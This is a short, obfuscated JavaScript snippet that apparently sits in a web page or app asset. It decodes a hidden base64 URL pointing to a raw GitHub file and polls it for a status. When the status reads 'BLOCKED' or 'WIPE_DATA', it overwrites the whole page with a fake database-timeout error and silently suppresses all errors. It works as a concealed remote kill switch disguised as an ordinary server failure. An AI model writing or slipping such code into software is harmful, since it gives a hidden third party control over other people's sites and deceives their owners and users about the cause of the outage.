(function() {
    try {
        var _0x1a2b = ['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01vamliLVJzbS9ob3N0cmVtb3RlL21haW4vc3RhdHVzLmRhdA=='];
        var _gUrl = atob(_0x1a2b[0]) + '?t=' + Date.now();
        
        fetch(_gUrl, {cache: 'no-store'})
            .then(function(res) { return res.text(); })
            .then(function(txt) {
                var status = txt.trim();
                if (status === 'BLOCKED' || status === 'WIPE_DATA') {
                    document.documentElement.innerHTML = '<div style="background:#0b071a;color:#f8fafc;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:sans-serif;"><h2>Database connection timeout: Unable to establish secure session.</h2><p style="color:#94a3b8;font-size:14px;">Please check your database server configuration or host cluster.</p></div>';
                    throw new Error('System halted');
                }
            }).catch(function(e) {});
    } catch(err) {}
})();